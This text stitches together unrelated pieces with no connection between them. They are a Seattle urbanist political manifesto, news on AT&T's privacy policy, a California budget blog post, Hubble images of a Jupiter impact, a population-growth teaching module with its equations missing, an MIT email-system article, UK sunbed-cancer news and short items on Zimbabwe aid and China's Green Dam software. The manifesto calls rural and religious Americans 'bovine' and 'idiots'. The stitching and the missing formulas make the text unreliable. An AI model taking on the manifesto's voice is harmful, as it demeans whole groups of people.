And we 've done it : Last year , Mayor Greg Nickels unveiled a new push to increase density outside downtown by increasing building heights and providing incentives to developers who build inner-city housing .
The more housing that is built in cities , the more people can afford to live there .
And the more cities pass laws that make it easier to live in cities -- laws like Washington State 's inflation - indexed minimum wage , which passed overwhelmingly in Seattle -- the more cities will attract the kind of culturally and economically diverse populations that make them attractive places to work and live .
And , as counterintuitive as it may seem to composting , recycling self - righteous suburbanites , living in dense urban areas is actually better for the environment .
The population of New York City is larger than that of 39 states .
But because dense apartment housing is more energy efficient , New York City uses less energy than any state .
Conversely , suburban living -- with its cars , highways , and single - family houses flanked by pesticide - soaked lawns -- saps energy and devastates the ecosystem .
Cities ' freedom to go their own way extends , of course , beyond mere infrastructure .
Urban dwellers are cultural libertarians -- we do n't just tolerate a diversity of lifestyles and attitudes , we embrace it .
Seattle , for example , has over 1000 churches , mosques , and synagogues .
From San Francisco to Ann Arbor to Seattle , cities have been the vanguard .
Drug reform is a prime example .
Eight states have passed medical marijuana initiatives ; none could have done so without the pro-pot clout of cities .
Last year , Seattle voters overwhelmingly passed Initiative 75 , which effectively decriminalizes marijuana possession by making it cops ' lowest law enforcement priority .
And just this month , Ann Arbor passed a law legalizing medical marijuana , the second city in Michigan to do so .
There are countless other examples .
But the bottom line is this : Cities , not the outlying suburbs , are leading the way on drug reform .
And where cities go , the nation will inevitably follow .
Gay rights , another national issue , took a beating this November , as 11 states passed constitutional amendments banning gay marriage .
But locally , Seattle has ensured that gays and lesbians enjoy the full protection of the law .
Not only are Seattle city employees and employees of firms that contract with the city entitled to domestic partnership benefits , earlier this year , Mayor Nickels announced that the city would honor gay marriages from other progressive jurisdictions , such as Portland and San Francisco .
But there 's still more to do that the Feds and the State are loath to deliver : Subsidized childcare ; safe injection sites ; expanding the monorail through the rest of the city ; discouraging excessive auto use by taxing mileage ( to pay for more public transit ) ; and providing family planning for low - income families .
An aggressive new urbanist movement will go its own way , making the cities , not the states , the true laboratories of democracy .
URBAN STATES
In November 1960 , a black 6 - year - old girl named Ruby Bridges entered the newly desegregated William Frantz Public School in New Orleans .
In reaction to her admission , white parents withdrew their kids from Ruby 's class and she completed the first grade alone , with instruction from one teacher and support from a child psychiatrist .
Ruby 's walk to class on the first day of school inspired Norman Rockwell 's The Problem We All Live With .
In this painting ( one of Rockwell 's best , as far as we are concerned ) , a very black Ruby Bridges is escorted to school by four big white U.S. marshals .
The image is powerful because it represents the federal government as an institution and enforcer of reason .
The white bigots of New Orleans can complain , bitch , and threaten the lives of black boys and girls all they want , but in the end the federal government steps in to ensure that the rights of every American are protected .
This image of the federal government is now in a coma .
The lawmaking bodies that are clustered in Washington , D.C. ( the Senate , the House , the Justice Department , the Supreme Court , the White House ) , no longer form the enlightened center from which reason and justice emanate .
During the civil rights era , the federal government could claim to at least aspire to this transcendental order ( the Great Society , the War on Poverty , the Voting Rights Act of 1965 ) , but not today .
Since the beginning of the 21st century , Washington , D.C. , has exerted a force that is not progressive ( as epitomized by Rockwell 's painting ) but oppressive .
This is not an exaggeration .
For example , the sole reason why the state of California -- or more accurately , the cities of California through the agency of the state -- turned to its own citizens to establish funding for stem cell research is because the federal government , in the form of the reelected Bush administration , holds a profoundly backward position on the matter .
Under Bush , the federal government spent almost nothing ( $ 25 million ) this year on stem cell research , a policy that 's entirely informed by the bizarre belief in a God who has a white beard , lives in heaven , and hates the idea of stem cell research .
The reality is this :
There are over 100 million Americans ( most of them Christian ) whose lives would be improved or saved by therapies and treatments that could be developed through stem cell research .
The federal government , however , holds the opinion that God should not be deprived of worship from the souls that are supposedly housed in the miniscule cells of five - day - old embryos .
Realizing this is just plain stupid ( or country , an archaic synonym for stupid that should be revived in our post - 2004 election world ) , California 's citizens - - its urban citizens -- passed Proposition 71 , which would allocate for research nearly $ 300 million a year over the next 10 years .
This figure , $ 300 million , is three times larger even than what John Kerry proposed , and promises to bring the benefits of this new science to all Americans before the close of this decade .
Clearly the federal government is no longer the enforcer of reason , the cities are , we urbanites are .
Proposition 71 is just the beginning of a new , muscular urban politics .
More and more decisions involving health , education , transportation , and law must be wrested away from our theocratic federal government by large humanistic cities .
The federal government may give us its prayers but it will never give us even the most basic health care coverage .
The State of Hawaii has what the rest of America does n't have -- universal health care coverage .
Why can't other states do the same ?
Or , more to the point , why can't big cities compel the states they 're located in to do the same ?
Again , it is not the State of Washington that is blue , it is the concentrated population of Seattle that is deep blue ; and because Seattle is so damn big it has the power to dictate the politics of its generally hostile state .
So , this is not about state rights -- indeed , the counties in California that passed Proposition 71 by 60 percent or more were all urban ( San Francisco with the highest percentage in the whole state , 71 ) .
It 's about urban rights , about empowering the bastions of reason and rationality in a nation that is increasingly unreasonable and irrational .
As a resident of the city , you should be proud to be an urbanite .
URBAN VALUES
It 's no secret what the urban population is against -- the Bush administration and its red armies have done us the favor of making it a cinch to identify :
We oppose their sub-moronic , " faith - based " approach to life , and , as stated above , we hereby relinquish our liberal tendency to sympathize with their lack of , say , livable working conditions , a family wage , and a national health care program .
We no longer have to concern ourselves with the survival of the family farm , nor do we have to concern ourselves with saving fragile suburban economies from collapse .
They 're against us ; we 're against them .
This is a war .
But if liberals and progressives want to reach out past our urban bases , it might be helpful to identify some essential convictions , thereby allowing us to perhaps compete on " values . "
Identifying and articulating our core convictions , as opposed to compromising and downplaying them in search of some kind of non-urban appeal , might actually attract voters in exurbs and rural areas who understand the importance of cities to the national economy .
But even if it does n't , ours is a superior way of life .
Wherever people choose to live in this country , they should want to live as we do .
So how do we live and what are we for ?
Look around you , urbanite , at the multiplicity of cultures , ethnicities , and tribes that are smashed together in every urban center ( yes , even Seattle ) :
We 're for that .
We 're for pluralism of thought , race , and identity .
We 're for a freedom of religion that includes the freedom from religion -- not as some crazy aberration , but as an equally valid approach to life .
We are for the right to choose one 's own sexual and recreational behavior , to control one 's own body and what one puts inside it .
We are for life , liberty , and the pursuit of happiness .
The people who just elected George W. Bush to a second term are frankly against every single idea outlined above .
Unlike the people who flee from cities in search of a life free from disagreement and dark skin , we are for contentiousness , discourse , and the heightened understanding of life that grows from having to accommodate opposing viewpoints .
We 're for opposition .
And just to be clear :
The non-urban argument , the red state position , is n't oppositional , it 's negational -- they are in active denial of the existence of other places , other people , other ideas .
It 's reactionary utopianism , and it is a clear and present danger ; urbanists should be upfront and unapologetic about our contempt for their politics and their negational values .
Republicans have succeeded in making the word " liberal " -- which literally means " free from bigotry ... favoring proposals for reform , open to new ideas for progress , and tolerant of the ideas and behavior of others ; broad - minded " - - into an epithet .
Urbanists should proclaim their liberalism from the highest rooftop ( we have higher rooftops than they do ) ; it 's the only way we survive .
And in our next breath , we should condemn their politics , exposing their conservatism as the anti-Americanism that it is , striving to make " conservative " into an epithet .
Let 's see , what else are we for ?
How about education ?
Cities are beehives of intellectual energy ; students and teachers are everywhere you look , studying , teaching , thinking .
In Seattle , you can barely throw a rock without hitting a college .
It 's time to start celebrating that , because if the reds have their way , advanced degrees will one day be awarded based on the number of Bible verses a person can recite from memory .
In the city , people ask you what you 're reading .
Outside the city , they ask you why you 're reading .
You do the math -- and you 'll have to , because non-urbanists can hardly even count their own children at this point .
For too long now , we 've caved to the non-urban wisdom that decries universities as bastions of elitism and snobbery .
Guess what :
That 's why we should embrace them .
Outside of the city , elitism and snobbery are code words for literacy and complexity .
And when the oil dries up , we 're not going to be turning to priests for answers -- we 'll be calling the scientists .
And speaking of science : SCIENCE !
That 's another thing we 're for .
And reason .
And history .
All those things that non-urbanists have replaced with their idiotic faith .
We 're for those .
As part of our pro-reason platform , we 're for paying taxes -- taxes , after all , support the urban infrastructure on which we all rely , and as such , are a necessary part of the social contract we sign every day .
We are for density , and because we 're for density , we 're for programs that support it , like mass transit .
If you ignore the selfish whimperings of the Kirkland contingent , it 's not too hard to envision a time when the only vehicles allowed on the streets of Seattle are buses , trams , and shuttles .
Utopian ?
Wrong : reality - based .
It 's a better , smarter way to live , and the urbanist is always in favor of that .
People who commute to the city for their livelihood and then attack urban areas and people in the voting booth are the worst kind of hypocrites .
Commuters , we neither want nor need you .
We welcome , however , new residents , new urbanites , the continual influx of people from other places who come here to stay ( are you listening , liberal residents of Idaho , Utah , and Wyoming ? ) .
These transplants help create the density we find so attractive , and they provide the plurality that makes cities thrive .
A city belongs to everyone in it , and expands to contain whoever desires to join its ranks .
People migrate to cities and open independent businesses or work at established ones .
They import cultural influences , thus enriching the urban arts and nightlife , which in turn enrich everything .
Most importantly , they bring the indisputable fact of their own bodies and minds .
We wait in line with them at QFC , we stand shoulder to shoulder with them at the bar , we cram ourselves next to them on the bus .
We share our psychic and physical space , however limited it might be , because others share it with us .
It 's not a question of tolerance , nor even of personal freedom ; it 's a matter of recognizing the fundamental interdependence of all citizens -- not just the ones who belong to the same church .
Non-urbanites have chosen to burn the declaration of interdependence , opting instead for tyranny , isolationism , and " faith . "
They can have them .
These , of course , are broad strokes .
We all know that not everyone who lives in the suburbs is a raving neo-Christian idiot .
The raving neo-Christian idiots are winning , however , so we need to take the fight to them .
In this case , the fight is largely spiritual ; it consists of embracing the reality that urban life and urban values are the only sustainable response to the modern age of holy war , environmental degradation , and global conflict .
More important , it consists of rejecting the impulse to apologize for living in a society that prizes values like liberalism , pluralism , education , and facts .
It 's time for the Democratic Party to stop pandering to bovine , non-urban America .
You do n't apologize for being right -- especially when you 're at war .
These days AT&T knows a great deal about its customers : who they call , where they travel , what they watch on TV , what sites they visit on the Web .
It has taken a new shot at explaining to them what information it collects and why in a new privacy policy that it posted Thursday morning .
The policy is a draft that in 45 days will replace the 17 policies now used by its various subsidiaries .
I can hear the chorus of yawns and wisecracks already .
Privacy policies are typically little more than boilerplate that have very little to do with protecting people ’s privacy or even giving them useful information to help them understand which companies to do business with .
But AT&T has decided that appearing to take the high ground on privacy will help it in Washington in its battle with Google , and perhaps will improve its image among those who are angry about its cooperation with the government ’s warrantless wiretapping program .
But I ’ve been talking to Dorothy Attwood , AT&T ’s chief privacy officer , about this project for several weeks .
And it does seem like an earnest effort to lay out for people what AT&T knows about them .
“ It shows we are a big company , ” she said .
“ We have lots of information and lots of uses of the information . ”
Ms. Attwood said that this effort did n’t really change AT&T ’s standard for how it handles customer information but that it did make the disclosure more explicit .
Even this exercise in writing may have an impact .
“ Clarity brings the potential for greater scrutiny about what our privacy and our usage of data practices are , ” she said .
“ Other companies do n’t have that clarity . ”
To my reading , there is in fact a directness to the policy that is often lacking .
( If you are interested , read it yourself and leave your reaction in the comments . )
It has a prominent section on location information , one of the biggest new types of information being collected by cellphone companies .
It makes clear that AT&T knows where its cellphone customers are and uses that information to show ads for local merchants when they check yellow pages and use other services .
The policy is certainly explicit in addressing many practices that other companies gloss over .
For example , it says that AT&T buys information about customers from credit bureaus and mailing list aggregators .
And it explains how it tracks users of its
Web sites and then can use that data to tailor ads to them on other sites .
( This came up when Ms. Attwood misspoke about this practice at a Congressional hearing . )
AT&T ’s new policy even addresses the topic of that hearing directly , asserting that the company does not use technology called deep packet inspection to track the surfing behavior of its Internet customers to use in advertising .
It promises to ask permission before it does so .
The policy says the company is working on other ways to explain how data is used to tailor advertisements .
AT&T ’s privacy policy , perhaps more than for other companies , has a political component .
Its previous policy , released six months after the warrantless wiretapping program was first published , says in the third paragraph :
We also have an obligation to assist law enforcement and other government agencies responsible for protecting the public welfare , whether it be an individual or the security interests of the entire nation .
Taken as a whole , the new document shows that AT&T has access to a vast amount of information about people , and it claims the right for all parts of AT&T to do almost anything with that data , including trying to sell customers other services , set prices and sell advertising to other companies .
AT&T set a few limits , most significantly that it wo n’t sell personal information about customers to third parties , except , of course , that it publishes the name , address and phone numbers of all its local telephone customers who do n’t pay for unlisted numbers .
The site is up front about the fact that it will give information about you in response to government subpoenas , government orders and lawful discovery requests in civil suits .
AT&T does not say it will notify you in advance that it is going to turn over information in response to a government order or lawsuit , except in the case of TV viewing information where such notice is required by law .
( The company offers television programming through its U - verse Internet service . )
The policy offers only one significant choice : Customers can send an e-mail to request that AT&T not market to them by e-mail , telephone or postal mail .
It also offers a procedure for customers to request the billing information AT&T keeps about them , but it does n’t offer a window onto the Web tracking , television usage monitoring and location following that the company does .
The company says it can keep all the information it collects about customers as long as they do business with AT&T .
Many privacy advocates argue that a policy to have records regularly destroyed can be an important way to prevent their misuse .
And the company gives itself wide authority to do most anything with data that it defines as anonymous or aggregate .
That means it well create a service that would let advertisers put ads on the cellphones of “ American Idol ” fans in Pittsburgh who call florists more than once a week .
But interestingly , AT&T has created a rather broad definition of what is personal information , rather than anonymous information .
This is important because a lot of data that some companies assert is not personally identifiable , like Internet Protocol addresses , sometimes can be used to track down individuals .
AT&T says it will treat as personal “ information that directly identifies or reasonably can be used to identify an individual Customer or User . ”
That definition forces the company to protect anything that can reasonably be used to track someone down .
I do n’t want to make too much of this .
Privacy policies have generally been ways for companies to protect themselves from lawsuits , rather than protecting their customers from hucksters , nosy government officials or Peeping Toms .
And AT&T is not breaking new ground in giving customers information and control over how it tracks them .
But the company is saying more clearly than most other big companies that it knows a lot about you , that it will use that information to help it make more money in any number of ways , that it will keep the data for as long as you remain a customer , and that it can be forced to give all that information to the government without giving you the chance to object .
Californians are scratching their heads trying to figure out why their government has run out of cash .
Some blame the constitution .
Some blame the governor .
Some blame the lobbyists .
Let ’s run a few numbers .
The median wage of a California state employee is $ 66,000 ( source ) .
The median wage among all Californians ( including those state workers ) is just over $ 36,000 .
The state employee can retire with a full pension in his or her late 40s or early 50s , which essentially means that the taxpayers have to pay for double the number of state workers that are required to provide current services .
In addition to salaries that are much higher than private sector equivalents , the state employee has health care and other benefits that by themselves may exceed the total compensation of a full - time private sector employee .
The reasonable question to ask is not “ How did they run out of cash ? ” but “ How was this ever supposed to work ? ”
The picture is worse than the numbers would suggest .
A lot of new Californians are working illegally .
Their wages , which may be paid in cash , are less than $ 36,000 per year , and are not reflected in official statistics .
Yet an immigrant who arrives to take a $ 10 per hour job still requires teachers for his children , policemen and firemen for his neighborhood , etc .
California has a tax burden of 10.5 percent of its citizens ’ income , higher than the U.S. average of 9.7 percent ( source ) .
Due to the fact that California government has grown so much in the past few decades , its pension and health care payment obligations for retired state workers are going to skyrocket in the next 20 - 30 years .
( The inefficient states of the Eastern U.S. were more or less equally inefficient in 1980 and had roughly the same population and size of government workforce . )
California could become solvent … if it can insure that everyone who moves to the state for the next 30 years is a medical doctor earning at least $ 150,000 per year from Medicare , Medicaid , and other out of state sources .
[ Related : This guy calculates that , adjusted for inflation , California government now spends 3.54X as much per citizen as it did in 1970 .
It seems hard to believe , but I do n’t have enough data to contradict it .
The federal government is not doing a whole lot better , according to this Congressional Budget Office posting .
What keeps the Feds going is their ability to borrow and print money . ]
NASA 's Hubble Space Telescope has recorded the most detailed images yet of the plume of atmospheric debris caused by an object that plunged into Jupiter in a rare collision with the planet .
Scientists used the telescope on Thursday to capture what they call the " sharpest visible - light picture " so far of the expanding gash .
Anthony Wesley , 44 , a computer programmer from Murrumbateman , a village north of Canberra , was the first to make the discovery last week using his backyard 14.5 - inch reflecting telescope .
Amy Simon - Miller of NASA 's Goddard Space Flight Center in Greenbelt , Maryland . , says the magnitude of the impact is believed to be rare .
Simon - Miller estimates the diameter of the object that hit the planet was the size of several football fields .
The debris possibly came from a comet or asteroid that hit Jupiter .

NASA also says the new images prove repairs done on the Hubble in May were successful .
Population growth and resource depletion
Essential Concepts
overpopulation is a leading environmental problem , exponential population growth and development leads to faster depletion of resources , population grows exponentially , why population prediction is difficult , population is not evenly distributed throughout the world .
A leading environmental problem : Overpopulation
Show results Hide Pollution ( unspecified ) : 14.7 % Global warming : 14.5 %
Air pollution : 13.5 % Habitat destruction : 13.1 % Resource depletion / degradation : 11.8 % Population growth / Overpopulation : 7.9 % Natural disasters : 6.2 % Water pollution : 6.6 % fossil fuels ( oil spills / ANWR ) : 6.0 % Waste management : 3.5 % Miscellaneous ( famine , poverty , ignorance , etc ) : 2.3 % compiled from Dr. Maureen Muldoon 's Environmental Geology course , Spring 2005 , UW - Oshkosh
It may surprise many of you to find out that overpopulation is a leading global environmental problem .
Remember on the first day of class , I asked you to list three important global environmental problems .
Here are the results of those surveys :
How many of these problems are the direct or indirect result of overpopulation ?
Would we have such a problem with the top three -- pollution , global warming and habitat -- if world population was not so large ?
Other than some of the natural disasters ( and even those are arguable ) , most of these other environmental problems are due to overpopulation .
Lifestyle affects resource use
Friends of the Earth define sustainability as " the simple principle of taking from the earth only what it can provide indefinitely , thus leaving future generations no less than we have access to ourselves . "
Many other organizations define it in differently ; however , the crux of the definition is the same .
Sustainability involves living within the limits of the resources of the Earth , understanding connections among economy , society , and environment , and equitable distribution of resources and opportunities .
2
To emphasize the disparate effects of population and lifestyle in developed vs. undeveloped countries have your students complete the " Ecological Footprint quiz " from Earthday Network .
This quiz shows the participants how many " Earths " would be needed if everyone lived the way that they do .
It is likely that students in the United States will find that they need approximately 5 planets to sustain their lifestyles !
It may surprise them to learn this .
If you want to reinforce ( or contrast ) the impact of undeveloped nations on resources , have your students take the quiz for an undeveloped nation .
You may wish to tell them the choices to make or you may want them to make decisions about how they think people in that country live .
The results may shock them .
Jump down to : Resource Use
There are 5 main concepts that our students struggle with when learning about population growth and the relationship of population to geological resource use : Students do not understand that overpopulation is the cause of many other environmental problems .
To help students understand this , one of my colleagues asks her students to list three important local and global environmental issues as part of a survey on the first day of class .
During the following lecture , she presents overpopulation as the top environmental problem :
The characterization of overpopulation as the cause of many environmental problems may be an oversimplification .
Consumption of natural resources also plays an important role in straining the environment .
On a global scale , it is probably pretty intuitive to students that the presence of more people in the world causes a bigger strain on natural resources .
What may not be intuitive is the concept of sustainability .
What does sustainability mean ?
It is the last part of the definition that joins population growth , particularly in developed countries , and resource use .
Developed countries , in general , have and use more of the Earth 's resources .
Population growth in developed countries puts a greater strain on global resources and the environment than growth in less developed nations .
For example , in 1997 , the U.S. generated 27.5 % of the world 's total COemissions ; more than five times that of India ( 5 % of the world 's total ) , a country with 4 - 5 times the population of tht U.S ( Texas A& M's LABB ) .
In fact , the way of life in the United States , on average , requires approximately 5 times the resources available on Earth today ( Earthday Network ) .
The above makes developed nations out to be the bad guys but that is not entirely true .
Undeveloped countries with large ( and growing ) populations also put a strain on the local environment and the limited resources that they have .
Countries that struggle to meet growing demands for food , fresh water , timber , fiber and fuel can alter the fragile ecosystems in their area , putting a great strain on the limited resources that they have to draw from ( ICTSD.org ) .

The algebraic solution to this differential equation iswhere :

Population grows exponentially - if the rate of natural increase ( ) does n't change .
The variableis controlled by human behavior as described below
Students may have a hard time understanding that population growth is controlled not only by birth and death rates but also by the present population .
The mathematics of exponential growth govern the prediction of population growth .
In some cases , you may want to point out that students may have heard of exponential growth in other contexts , such as compound interest or the spread of viral disease .
The rate of population growth at any given time can be written :
Where :
The equation above is a differential equation and may not be appropriate for some introductory courses -- but most students in entry - level courses can handle the algebraic solution presented below .
Essential to understanding the mathematics of population growth is the concept of doubling time .
Doubling time is the time it takes for population to double and it is related to the rate of growth .
When the population doubles , N = 2N 0 .
Thus the equation becomes
ln 2/ r = t or 0.69 / r = t ; where r is the rate and t is the doubling time .
In many ways , it is similar to half - life .
But instead of the time it takes for half the isotopes to decay , it is the time it takes for a known quantity to double .
Population prediction models : Subject to change

Higher income / more developed countries have lower birth and death rates disease - in a given year ( or even decade ) epidemics of infectious diseases can increase death rate dramatically , particularly for a specific area .
For example , the bubonic plague decimated Europe in the 14th century - the population of Europe was cut nearly in half by 1400 .

modified from UNESCO - World Bank
Let 's think about some of the factors that may modify the birth and death rates in a region ( or in the world ) .
Do you think these things are constant throughout time ?
What other " variables " could change them ?
There are many more variables that can affect change in the population and its growth - have your students brainstorm about other factors that affect the rate and prediction of population growth .
UNESCO and World Bank have a website with a number of learning modules on population related topics .
Wide open spaces can be hard to find
Students ( especially those in introductory classes ) may have a difficult time understanding why predictions of population growth are difficult to make and constantly debated .
To help them understand the difficulty of prediction have them think about the complex variables that must be considered when predicting population growth .
It may be fairly obvious to students that calculation of the rate of population growth can be expressed in the following equation :
Thus , population growth is directly related to :
And it may be quite intuitive to students that .
However , students may not have considered the factors that can influence both birth and death rates .
The concept of population density is sometimes difficult for students to grasp .
Population density can be calculated by dividing the total population of a city ( or country ) by its area .
Total population / area = population density
I also use a story about a friend of mine who moved from China to the U.S. about 5 years ago .
My friend Gong Yan moved to Atlanta from Wuhan , China , where he grew up and went to university .
When he got to Atlanta , he was very uncomfortable because he felt there was so much open space .
In Wuhan , when he was in a public place , he was always surrounded by people - people bumping into him , people talking to him , people streaming along the street .
He would often go to a mall in Atlanta just to be around people .
In contrast , many Americans become uncomfortable when in large crowds .
A friend of mine traveled to Japan and tells a story of standing in line at the airport with the Japanese gentleman behind her pushing her with her body while she strained not to touch the person in front of her in line .
Culturally , we deal with population density problems by changing our concept of " personal space " .
In many parts of the U.S. , we have the luxury of significant amounts of personal space ; other developing and highly urban places do not .

Two World Population activities
The SERC Starting Point site has two activities , students explore models of population with Excel and students compare models to actual data .
Each has an activity sheet ( as PDF ) that can be downloaded and handed out to your students .
Student Resources
My students mostly come from small towns and cities in Northeast Wisconsinand may not comprehend that other places in the world are far more crowded than where they live .
To give them a sense of perspective , I try to give them a sense of what it is like to live in other places .
For example , I tell them that in Winnebago county ( the county UW - Oshkosh is situated ) has a population density of 138 people / km .
On the other hand , in 1990 , Kowloon ( a walled part of Hong Kong ) had a population density 1,924,563 people / km ( demographia.com ) !
Other places of interest include : Bombay ( Mumbai ) , India , with 39,860 people / km , Manhattan ( New York City ) , United States , with 25,849 people / km , London , England , with 4,700 people / kmand Sydney , Australia , with about 2,500 people / km( wikipedia.com ) .
Estimates of population density by city vary considerably but the general idea is that most small cities in the U.S. are not very densely populated .

Microsoft Exchange Is MIT ’s New Email System
Beginning this summer , Information Systems and Technology has begun transitioning portions of the MIT e-mail system to Microsoft Exchange , as well as changing the way spam is handled .
Changes to mail access & storage
Microsoft Exchange replaces the portion of the mail system that stores messages waiting to be read , which is currently implemented using several servers running a open - source program called Cyrus and a mail protocol known as IMAP , the Internet Message Access Protocol .
The change will remain transparent to most Gmail users , whose mail is forwarded directly to Gmail and does not remain on the MIT mail servers .
Those Gmail users who split their e-mail to both the MIT mail servers and to Gmail may have their MIT mail storage affected .
Users who read their e-mail with mail clients like Outlook , Pine , and Apple Mail may also be affected , as well as those who use MIT ’s Webmail service .
Users of the current Webmail system are encouraged by IS&T to use Microsoft ’s Outlook Web Access ( OWA ) , a web - based interface specific to Microsoft Exchange .
Christine C. Fitzgerald , a spokesperson for IS&T , said , “ We are running Exchange servers in order to offer Microsoft Exchange .
This is an optional infrastructure solution for those departments who will benefit from an integrated e-mail and calendaring solution . ”
Microsoft Exchange ’s calendaring and scheduling support will allow IS&T to phase out TechTime , the existing recommended calendaring system .
The switchover to Microsoft Exchange will be done on a department - by - department basis to best utilize the new server ’s calendar and scheduling capabilities , Fitzgerald said .
Fitzgerald said that several departments are already testing the Exchange system .
IS&T declined to discuss the cost of the Microsoft Exchange deployment in detail , saying that the “ costs for upgrading and maintaining the infrastructure including new infrastructure , such as Exchange servers , are funded through the IS&T budget . ”
Fitzgerald said that the mail system ultimately “ gets to the point where upgrading the hardware is not enough to keep current .
We ’re trying to keep our systems current to give MIT the ability to then integrate new services into the future . ”
The existing Cyrus IMAP system will remain intact for current students in the immediate future , but incoming students will be placed on the new Exchange system .
According to Fitzgerald , old mail in the IMAP system will be kept .
New spam filtering system
The other major change to MIT ’s mail system is the introduction of Symantec ’s Brightmail AntiSpam filters and quarantine system , a web - based system which has replaced the Apache SpamAssassin filters .
Most users have been transitioned to the Brightmail system , though users can choose to return to the SpamAssassin system .
Regarding the new spam filters , Fitzgerald said that “ Spam Quarantine simplifies management of spam messages through automatic daily summaries to your inbox . ”
Feedback about the new spam quarantine system has been largely positive , Fitzgerald said .
Student Reactions
Some students passionately expressed concern about the mail system changes .
Jeff Z. Chen ’ 12 suggested that students should simply use Gmail instead of MIT ’s mail infrastructure .
“ Gmail ’s interface is fluid and dynamic , ” Chen said , “ whereas Outlook is chock full of rogue buttons scattered about the user interface …
Basically the only practical advantage that Outlook has ( for students ) is its robust rules and filters interface . ”
Regarding the new Spam filters , Chen said , “ As for Spam Quarantine , I ’ve heard various opinions .
Most people like the daily spam report , but some liken the report itself as spam .
Most have reported fewer spam , but a few have gotten much more .
An upside is that Spam Quarantine filters spam before it actually gets to your mail server , so it wo n’t fill up your quota .
I ’d say Spam Quarantine is probably an improvement overall . ”
Other students , such as Qiaochu Yuan ’ 12 and Emily Zhao ’ 12 , shared similar views , which favor forwarding mail to Gmail over the use of Microsoft Outlook ( Microsoft ’s client , which synchronizes with Exchange to more effectively take advantage of all of its features ) .
In an e-mail , Yuan writes , “ I stopped using Outlook years ago because I was frustrated with its user interface , among other things .
Mostly I did n’t like the lack of searchability .
Often I lost important e-mails , such as those involving passwords , and one of Gmail ’s biggest advantages over other clients , at least when it first debuted , was full searchability . ”
Similarly , in an e-mail , Zhao admits that she does not use Outlook herself , but she still favors starting rising freshmen on the system , saying , “ If this is what MIT has decided to go with , then I guess the prefrosh should start out on this system .
There ’s no reason for them to learn to use the old system . ”
A fourth student , who is uncomfortable with the general anti-Microsoft attitude on campus , already uses Microsoft Exchange and said that they were happy with the transition of to the new system .
The student favors Microsoft Exchange , saying “ I use Exchange because all my stuff — calendar , tasks , contacts — are seamlessly synchronized between my desktop client , my phone , and a web client .
Spam is n’t an issue .
Over the last month , maybe I ’ve had one or two e-mails slip by the filter , but it ’s pretty solid .
Also , server - side rules are wonderful in Exchange . ”
Ministers are preparing to clamp down on the cosmetic tanning industry after international experts on cancer said sunbeds belonged in the same category of carcinogenic risk as tobacco smoke .
The Department of Health said it was reviewing its stance on sunbeds after the International Agency for Research on Cancer ( IARC ) upgraded its assessment of the risk posed by sunbeds and sunlamps .
Until now the IARC , which advises the World Health Organisation , categorised sunbeds as " probably carcinogenic to humans " .
But after conducting further research into the evidence around their effects it has placed them in its highest cancer risk category .
The Department of Health , which has resisted previous calls to regulate the industry , said : " Sunbeds can be dangerous – we must ensure that people who use them do so safely .
If necessary we will look at new laws to protect young people . "
A report by Dr Fatiha El Ghissassi and colleagues from the IARC in France published tomorrow in The Lancet Oncology said : " The use of UV - emitting tanning devices is widespread in many developed countries , especially among young women .
A comprehensive meta- analysis concluded that the risk of skin melanoma is increased by 75 % when use of tanning devices starts before 30 years of age . "
Several studies had also linked sunbed use to a greater likelihood of developing a rare eye cancer called ocular melanoma , they added .
The IARC 's WHO agency for research on cancer therefore " raised the classification of the use of UV - emitting tanning devices to Group 1 , ' carcinogenic to humans ' , " they said .
Other recognised carcinogens include tobacco smoke , asbestos , benzine , formaldehyde and the Epstein - Barr virus , which causes glandular fever .
Health campaigners last night welcomed the move and demanded government action .
Jessica Harris of Cancer Research UK said : " Given the dangers of sunbeds we want the government to act now to ban under - 18s from using sunbeds , close salons that are n't supervised by trained staff and ensure information about the risk of using sunbeds is given to all customers . "
People should avoid sunbeds completely for cosmetic purposes , she said . "
They have no health benefits and they increase the risk of cancer . "
Nina Goad of the British Association of Dermatologists said : " We know that ultraviolet radiation ( UVR ) causes skin cancer , and sunbeds create a tan by emitting UVR , so we welcome the recognition that sunbeds are carcinogenic .
It is high time that steps were taken to regulate the industry , to prevent children using sunbeds , and to ensure that sunbeds are subject to health warnings like other known carcinogens . "
Some salons advertise health " benefits " to using sunbeds but offer customers no guidance on health risks , she added .
" Hopefully categorising sunbeds as a known carcinogen will prompt the government to introduce compulsory health warnings on tanning beds . "
Julie Barratt of the Chartered Institute of Environmental Health , which represents environmental health officers , also called for new restrictions .
" This new research underlines the case for urgent reform .
We want coin -operated ones , where there are no staff , banned because anyone , including children , can go in and do what they like .
All sunbed premises should be registered with the local authority , under - 18s should not be able to use them , and everybody using a sunbed should have to be given advice about the health risks . "
A Department of Health spokesman said it was examining what action it might take following a report last month from the Committee on Medical Aspects of Radiation in the Environment ( Comare ) , a group of government advisers .
It recommended that anyone under 18 should not be allowed to use sunbeds .
Professor Alex Elliott , who chairs Comare , said people could buy a walk - in tanning machine that inside two minutes gave the user the same UV exposure as a fortnight 's holiday in the Mediterranean .
The spokesman added : " We commissioned a report from Comare to give us a better understanding of the issues around sunbeds .
This report was published in June and we are considering the recommendations in full . "
Government sources said action was " very likely " .
Kathy Banks , chief executive of the Sunbed Association , said it disputed IARC 's reclassification of sunbeds as carcinogenic .
She said : " There is no proven link between the responsible use of sunbeds and skin cancer .
The relationship between UV exposure and an increased risk of developing skin cancer is only likely to arise where over - exposure – that is , burning – has taken place .
" This outcome would be the same whether burning takes place on a sunbed or on a beach or in a park or garden in natural sunlight .
Over 80 % of sunbed users are very knowledgeable about the risks associated with over - exposure to UV and the majority of sunbed users take 20 or less sunbed sessions a year . "
President Obama pledged $ 73 million to Zimbabwe after meeting with the country ’s Prime Minister Morgan Tsvangirai at the White House on Friday .
Obama said progress has developed in the economically - shattered nation since Prime Minister Morgan Tsvangarai entered a power - sharing arrangement with longtime President Robert Mugabe four months ago .
We 've seen progress from the prime minister , Obama said , after meeting with Tsvangirai in the Oval Office .
Tsvangirai is on a three - week tour seeking international aid in an attempt to pull the country out of economic chaos that has seen rocketing inflation and led to many Zimbabweans fleeing the country .
Since the unity government was formed more than $ 800 m in credit lines has been secured to rebuild the wrecked economy , and the International Monetary Fund has said it will resume technical aid to Harare .
The " Green Dam " filtering software that the Chinese government is reportedly requiring for all PCs sold there contains pirated code from Solid Oak Software , a U.S. software manufacturer claimed Friday .
The " Green Dam " filtering software that the Chinese government is reportedly requiring for all PCs sold there contains pirated code , a U.S. software manufacturer claimed Friday .
Solid Oak Software , the developer of CyberSitter , claims that the look and feel of the GUI used by Green Dam mimics the style of CyberSitter .
